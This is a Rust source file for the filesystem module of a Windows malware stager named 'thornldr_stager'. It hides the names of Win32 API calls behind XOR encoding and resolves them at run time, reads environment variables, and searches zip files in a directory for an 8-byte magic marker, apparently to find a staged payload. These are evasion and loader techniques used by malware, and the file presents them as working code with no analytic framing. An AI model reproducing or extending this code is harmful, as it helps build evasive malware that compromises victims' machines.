// fs.rs — Win32 filesystem primitives for thornldr_stager.
//
// Everything here is resolved lazily via the XOR-encoded-name resolver. No
// std, no alloc; all string work happens in fixed stack buffers.
//
// Public entrypoints:
//
//   - `get_env_w(name_ascii, out) -> bool`
//       Read an environment variable as UTF-16 into `out`. Returns true on
//       success; `out` is null-terminated on success.
//
//   - `find_thornpld_zip(dir_wstr, file_buf, magic) -> Option<(usize, usize)>`
//       Enumerate *.zip in `dir_wstr`, ReadFile each into `file_buf`, scan
//       for `magic`. On the first match, return `(file_len, magic_offset)`.

use core::ffi::c_void;
use core::sync::atomic::AtomicPtr;

use crate::resolver::{resolve_cached, xor_const, ENC_KERNEL32};

// ── Win32 types / constants ─────────────────────────────────────────────────
const MAX_PATH: usize = 260;

#[repr(C)]
pub struct FindDataW {
    pub dw_file_attributes:      u32,
    pub ft_creation_time:        [u32; 2],
    pub ft_last_access_time:     [u32; 2],
    pub ft_last_write_time:      [u32; 2],
    pub n_file_size_high:        u32,
    pub n_file_size_low:         u32,
    pub dw_reserved0:            u32,
    pub dw_reserved1:            u32,
    pub c_file_name:             [u16; MAX_PATH],
    pub c_alternate_file_name:   [u16; 14],
}

impl FindDataW {
    pub fn zero() -> Self {
        // SAFETY: all fields are POD (u32/u16 arrays).
        unsafe { core::mem::zeroed() }
    }
}

const INVALID_HANDLE:         *mut c_void = -1isize as *mut c_void;
const GENERIC_READ:           u32 = 0x8000_0000;
const FILE_SHARE_READ:        u32 = 0x0000_0001;
const OPEN_EXISTING:          u32 = 3;
const FILE_ATTRIBUTE_NORMAL:  u32 = 0x80;

// ── Function pointer types ──────────────────────────────────────────────────
type FnGetEnvVarW       = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
type FnFindFirstFileW   = unsafe extern "system" fn(*const u16, *mut FindDataW) -> *mut c_void;
type FnFindNextFileW    = unsafe extern "system" fn(*mut c_void, *mut FindDataW) -> i32;
type FnFindClose        = unsafe extern "system" fn(*mut c_void) -> i32;
type FnCreateFileW      = unsafe extern "system" fn(
    *const u16, u32, u32, *mut c_void, u32, u32, *mut c_void,
) -> *mut c_void;
type FnReadFile         = unsafe extern "system" fn(
    *mut c_void, *mut u8, u32, *mut u32, *mut c_void,
) -> i32;
type FnCloseHandle      = unsafe extern "system" fn(*mut c_void) -> i32;
type FnGetFileSizeEx    = unsafe extern "system" fn(*mut c_void, *mut i64) -> i32;

// ── Resolver slots ──────────────────────────────────────────────────────────
static SLOT_GETENV:     AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_FFIRST:     AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_FNEXT:      AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_FCLOSE:     AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_CREATEF:    AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_READF:      AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_HCLOSE:     AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_SIZE:       AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());

// API name constants. Each includes the trailing NUL so the decoded bytes
// form a valid C-string when written into a stack buffer by `decode_into`.
const ENC_GETENV:  [u8; 24] = xor_const(*b"GetEnvironmentVariableW\0");
const ENC_FFIRST:  [u8; 15] = xor_const(*b"FindFirstFileW\0");
const ENC_FNEXT:   [u8; 14] = xor_const(*b"FindNextFileW\0");
const ENC_FCLOSE:  [u8; 10] = xor_const(*b"FindClose\0");
const ENC_CREATEF: [u8; 12] = xor_const(*b"CreateFileW\0");
const ENC_READF:   [u8;  9] = xor_const(*b"ReadFile\0");
const ENC_HCLOSE:  [u8; 12] = xor_const(*b"CloseHandle\0");
const ENC_SIZE:    [u8; 14] = xor_const(*b"GetFileSizeEx\0");

#[inline] unsafe fn p_getenv()  -> Option<FnGetEnvVarW>     {
    let p = resolve_cached(&SLOT_GETENV, &ENC_KERNEL32, &ENC_GETENV);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_ffirst()  -> Option<FnFindFirstFileW> {
    let p = resolve_cached(&SLOT_FFIRST, &ENC_KERNEL32, &ENC_FFIRST);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_fnext()   -> Option<FnFindNextFileW>  {
    let p = resolve_cached(&SLOT_FNEXT,  &ENC_KERNEL32, &ENC_FNEXT);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_fclose()  -> Option<FnFindClose>      {
    let p = resolve_cached(&SLOT_FCLOSE, &ENC_KERNEL32, &ENC_FCLOSE);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_createf() -> Option<FnCreateFileW>    {
    let p = resolve_cached(&SLOT_CREATEF,&ENC_KERNEL32, &ENC_CREATEF);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_readf()   -> Option<FnReadFile>       {
    let p = resolve_cached(&SLOT_READF,  &ENC_KERNEL32, &ENC_READF);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_hclose()  -> Option<FnCloseHandle>    {
    let p = resolve_cached(&SLOT_HCLOSE, &ENC_KERNEL32, &ENC_HCLOSE);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_size()    -> Option<FnGetFileSizeEx>  {
    let p = resolve_cached(&SLOT_SIZE,   &ENC_KERNEL32, &ENC_SIZE);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}

// ── Wide-string helpers ─────────────────────────────────────────────────────

/// Copy an ASCII byte slice into a wide (UTF-16) buffer, null-terminating.
/// Returns the number of u16 chars written (not including the NUL).
pub fn ascii_to_wide(ascii: &[u8], out: &mut [u16]) -> usize {
    let n = ascii.len().min(out.len().saturating_sub(1));
    let mut i = 0;
    while i < n {
        out[i] = ascii[i] as u16;
        i += 1;
    }
    out[n] = 0;
    n
}

/// Length of a null-terminated wide string.
pub unsafe fn wstrlen(p: *const u16) -> usize {
    let mut n = 0;
    while *p.add(n) != 0 { n += 1; }
    n
}

/// Concatenate `dir\name` (both wide, null-terminated) into `out`.
/// Returns true if the full path (including NUL) fits.
pub unsafe fn join_path(dir: *const u16, name: *const u16, out: &mut [u16]) -> bool {
    let dl = wstrlen(dir);
    let nl = wstrlen(name);
    if dl + 1 + nl + 1 > out.len() { return false; }
    // Copy dir.
    let mut i = 0;
    while i < dl { out[i] = *dir.add(i); i += 1; }
    out[i] = b'\\' as u16; i += 1;
    // Copy name.
    let mut j = 0;
    while j < nl { out[i + j] = *name.add(j); j += 1; }
    out[i + nl] = 0;
    true
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Read an environment variable into `out` as a null-terminated wide string.
/// `name_ascii` is XOR-decoded at the call site (caller passes plaintext).
pub unsafe fn get_env_w(name_ascii: &[u8], out: &mut [u16]) -> bool {
    let f = match p_getenv() { Some(f) => f, None => return false };
    // Build a wide version of the env var name on the stack.
    let mut name_w: [u16; 64] = [0; 64];
    if name_ascii.len() >= name_w.len() { return false; }
    ascii_to_wide(name_ascii, &mut name_w);
    let n = f(name_w.as_ptr(), out.as_mut_ptr(), out.len() as u32);
    n > 0 && (n as usize) < out.len()
}

/// Open a file, read its entire contents into `buf`. Returns the length
/// on success, or None on any error (file too big, read failure, etc.).
pub unsafe fn read_entire_file(path_w: *const u16, buf: &mut [u8]) -> Option<usize> {
    let createf = p_createf()?;
    let readf   = p_readf()?;
    let closeh  = p_hclose()?;
    let sizef   = p_size()?;

    let h = createf(
        path_w,
        GENERIC_READ,
        FILE_SHARE_READ,
        core::ptr::null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        core::ptr::null_mut(),
    );
    if h.is_null() || h == INVALID_HANDLE { return None; }

    let mut size: i64 = 0;
    if sizef(h, &mut size) == 0 || size <= 0 || (size as usize) > buf.len() {
        let _ = closeh(h);
        return None;
    }
    let total = size as usize;

    let mut read_total = 0usize;
    while read_total < total {
        let mut got: u32 = 0;
        let remain = (total - read_total) as u32;
        let ok = readf(h, buf.as_mut_ptr().add(read_total), remain, &mut got, core::ptr::null_mut());
        if ok == 0 || got == 0 { break; }
        read_total += got as usize;
    }
    let _ = closeh(h);
    if read_total == total { Some(total) } else { None }
}

/// Enumerate `<dir>\*.zip`, read each file into `buf`, and search for
/// `magic`. Returns `(file_len, magic_offset)` on the first match.
pub unsafe fn find_thornpld_zip(
    dir: *const u16,
    buf: &mut [u8],
    magic: &[u8; 8],
) -> Option<(usize, usize)> {
    let ffirst = p_ffirst()?;
    let fnext  = p_fnext()?;
    let fclose = p_fclose()?;

    // Build "<dir>\*.zip"
    let mut pattern: [u16; 320] = [0; 320];
    let dl = wstrlen(dir);
    if dl + 7 >= pattern.len() { return None; }
    let mut i = 0;
    while i < dl { pattern[i] = *dir.add(i); i += 1; }
    // "\*.zip"
    let suffix: [u16; 6] = [b'\\' as u16, b'*' as u16, b'.' as u16,
                            b'z' as u16, b'i' as u16, b'p' as u16];
    let mut j = 0;
    while j < 6 { pattern[i + j] = suffix[j]; j += 1; }
    pattern[i + 6] = 0;

    let mut fd = FindDataW::zero();
    let hfind = ffirst(pattern.as_ptr(), &mut fd);
    if hfind.is_null() || hfind == INVALID_HANDLE { return None; }

    let mut found: Option<(usize, usize)> = None;
    loop {
        // Build "<dir>\<cFileName>"
        let mut full: [u16; 320] = [0; 320];
        if join_path(dir, fd.c_file_name.as_ptr(), &mut full) {
            if let Some(len) = read_entire_file(full.as_ptr(), buf) {
                if let Some(pos) = scan_magic(&buf[..len], magic) {
                    found = Some((len, pos));
                    break;
                }
            }
        }
        let mut next = FindDataW::zero();
        if fnext(hfind, &mut next) == 0 { break; }
        fd = next;
    }
    let _ = fclose(hfind);
    found
}

/// Boyer-Moore would be overkill — the magic is small, the file is small,
/// and this only runs on candidate files. Plain O(n*m) search.
pub fn scan_magic(hay: &[u8], magic: &[u8; 8]) -> Option<usize> {
    if hay.len() < 8 { return None; }
    let end = hay.len() - 8;
    let mut i = 0;
    while i <= end {
        if hay[i]   == magic[0] && hay[i+1] == magic[1] &&
           hay[i+2] == magic[2] && hay[i+3] == magic[3] &&
           hay[i+4] == magic[4] && hay[i+5] == magic[5] &&
           hay[i+6] == magic[6] && hay[i+7] == magic[7]
        {
            return Some(i);
        }
        i += 1;
    }
    None
}
